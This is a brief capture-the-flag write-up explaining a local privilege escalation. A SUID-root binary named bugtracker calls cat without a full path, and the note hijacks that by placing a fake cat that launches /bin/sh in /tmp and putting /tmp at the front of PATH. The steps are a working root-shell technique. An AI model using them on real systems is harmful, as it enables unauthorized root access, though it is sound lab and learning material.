# SUID
Found a file with `find / -group bugtracker 2>/dev/null` that only members of `bugtracker` can execute. It has the SUID flag with root privileges.

```ad-info
SUID allows an alternate user to run an executable with the same permissions as the owner of the file instead of the permissions of the alternate user.
```

The file accept user input as a name of the file that will be read using `cat`, however, it does not specifies the whole path. Might be able to exploit this.

1. Create a file in /tmp directory named `cat` with this content:
```bash
/bin/sh
```

2. Set execute privileges:
```bash
$ chmod +x cat
```

3. Add /tmp directory to $PATH environmental variable.
```bash
export PATH=/tmp:$PATH
```
```ad-info
PATH is an enviroment variable on Unix-like operating systems, DOS, OS/2, and Microsoft Windows, specifying a set of directorioes where executable programs are located.
```

4. Execute `bugtracker` in `/tmp` directory.

5. Flag can be found in `/root` directory.

